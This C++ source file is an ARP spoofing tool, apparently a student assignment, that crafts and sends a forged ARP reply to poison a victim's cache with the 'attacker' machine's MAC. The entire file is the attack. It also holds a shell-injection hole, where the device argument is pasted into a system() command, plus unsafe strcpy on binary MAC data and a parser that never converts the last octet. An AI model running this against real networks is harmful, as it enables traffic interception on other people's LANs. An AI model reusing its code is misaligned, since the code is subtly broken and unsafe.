#include <iostream>
#include <pcap.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/ether.h>
#include <string.h>
#include <fstream>
#include <iomanip>
#include <sys/socket.h>

using namespace std;

void checkArgc(int argc);
void macAddrToHex(char* argvMac, u_int8_t *retnMac);
void findMyMac(char* device, u_int8_t *myMAC);
void printByHexData(u_int8_t* printArr,int length);
void printByMAC(u_int8_t *printArr, int length);

/*send_arp <dev> <sender ip> <target ip> <sender mac> <target mac>*/

int main(int argc, char *argv[])
{
    checkArgc(argc); //check argc & if wrong sentence print usage


    //u_int32_t sender_Addr;
    //inet_pton(AF_INET,senderIp,&sender_Addr); //ipv4 binary data is saved sender_Addr(little endian)


    //u_int32_t target_Addr;
    //inet_pton(AF_INET,targetIp,&target_Addr);


    u_int8_t sender_Mac[ETHER_ADDR_LEN];
    macAddrToHex(argv[4],sender_Mac);
    cout<<"Sender MAC : "<<argv[4]<<endl;

    u_int8_t target_Mac[ETHER_ADDR_LEN];
    macAddrToHex(argv[5],target_Mac);
    cout<<"Target MAC : "<<argv[5]<<endl;

    ether_header ep;

    strcpy((char*)ep.ether_dhost,(char*)sender_Mac); //destnation mac is sender mac

    char* device = argv[1];
    u_int8_t my_Mac[ETHER_ADDR_LEN];

    findMyMac(device,my_Mac);


    strcpy((char*)ep.ether_shost,(char*)my_Mac); //source mac is my mac

    ep.ether_type=htons(ETHERTYPE_ARP); //define next protocol

//    inet_pton(AF_INET,argv[2],&iph.ip_dst); //set destination IP to SenderIP


    struct ether_arp arp;

    arp.ea_hdr.ar_hrd=ntohs(1);             //set Hardware Type Ethernet
    arp.ea_hdr.ar_pro=ntohs(ETHERTYPE_IP);  //set protocol type IP
    arp.ea_hdr.ar_hln=6;             //set Hardware Size 6 -> MAC address size
    arp.ea_hdr.ar_pln=4;             //set Protocol length 4 -> 4 IP address size
    arp.ea_hdr.ar_op=ntohs(2);              //set opcode 2(reply)


    char* senderIp=argv[2];
    char* targetIp=argv[3];

    strcpy((char *)arp.arp_sha,(char *)my_Mac);  //set Source Address to Sender MAC
    inet_pton(AF_INET,targetIp,arp.arp_spa);     //set Source Protocol Address to Target IP
    strcpy((char*)arp.arp_tha,(char*)sender_Mac); //set Target Hardware Address to Sender MAC
    //macAddrToHex((char*)sender_Mac,arp.arp_tha);
    inet_pton(AF_INET,senderIp,arp.arp_tpa);    //set Target Protocol Address to Sender IP


    int packetLen = sizeof(struct ether_header)+sizeof(ether_arp);

    u_int8_t arpReply[packetLen];

    memcpy(arpReply,&ep,sizeof(struct ether_header));
    memcpy(&arpReply[sizeof(struct ether_header)],&arp,sizeof(struct ether_arp));

    int sock=socket(PF_PACKET,SOCK_PACKET,htons(ETH_P_ALL));
    cout<<"socket discryptor number : "<<sock<<endl;


    cout<<"Send Arp Packet Data "<<endl;
    printByHexData(arpReply,packetLen);

    if(send(sock,arpReply,packetLen,MSG_DONTROUTE)<0)//send() return send length if error -> -1
        cout<<"Send Error!!!"<<endl;

    return 0;
}

void checkArgc(int argc)
{
    if(argc!=6)
    {
        cout<<" *Usage :  send_arp <dev> <sender ip> <target ip> <sender mac> <target mac>"<<endl;
        cout<<" *MAC Address type : ab:cd:ef:ab:cd:ef "<<endl;
        exit(0);
    }
}


void macAddrToHex(char *argvMac,u_int8_t *retnMac)
{
    int cnt=0;
    char tempArr[3];
    u_int8_t value;


    int i=0;

    while(true)
    {
        if(argvMac[i]==':') //if char is ':'
        {
            strncpy(tempArr,argvMac,2);
            tempArr[2]=0;
            value=strtol(tempArr,NULL,16);
            retnMac[cnt++]=(int)value;

            if(cnt==6)
                break;


            argvMac=&argvMac[i+1]; //str cut & save
            i=0;// init index

        }else{
            i++;
        }
    }

}

void findMyMac(char* device,u_int8_t* myMAC)
{
    system("ifconfig > tmp.txt");
    string command="sed -n '/";
    command.append(device);
    command.append("/,/colisions/p' tmp.txt | grep ether > myMac.txt");

    system(command.c_str()); //find device config & find "ether" & save to myMac.txt
    system("rm tmp.txt"); //delete tmp File

    //find MAC address

    string MACadress;

    ifstream readFile("myMac.txt");

    getline(readFile,MACadress);

    if(MACadress.size()==0)
    {
        cout<<"MAC address can't find!!!!"<<endl;
        exit(1);
    }


    MACadress= MACadress.substr(MACadress.find('r')+2); //ether AB:CD:EF:AB:CD:EF MACadress.find('ether') is return 'r' location
                                                            //therefore +2(MAC adddress start location

    MACadress= MACadress.substr(0,MACadress.find(' '));

    int lengthOfMAC=18; //AB:CD:EF:AB:CD:EF\0 => 18byte
    char temp[lengthOfMAC];
    strcpy(temp,MACadress.c_str());

    macAddrToHex(temp,myMAC); //if not use this here caused BOF

    cout<<"My(Attacker) MAC Address : ";
    printByMAC(myMAC,6);

}

void printByHexData(u_int8_t *printArr, int length)
{

    for(int i=0;i<length;i++)
    {
        if(i%16==0)
            cout<<endl;
        cout<<setfill('0');
        cout<<setw(2)<<hex<<(int)printArr[i]<<" ";


    }

    cout<<dec<<endl;
}

void printByMAC(u_int8_t *printArr,int length)
{
    for(int i=0;i<length;i++)
    {
        cout<<setfill('0');
        cout<<setw(2)<<hex<<(int)printArr[i];
        if(i!=5)
            cout<<":";

    }

    cout<<dec<<endl<<endl;
}
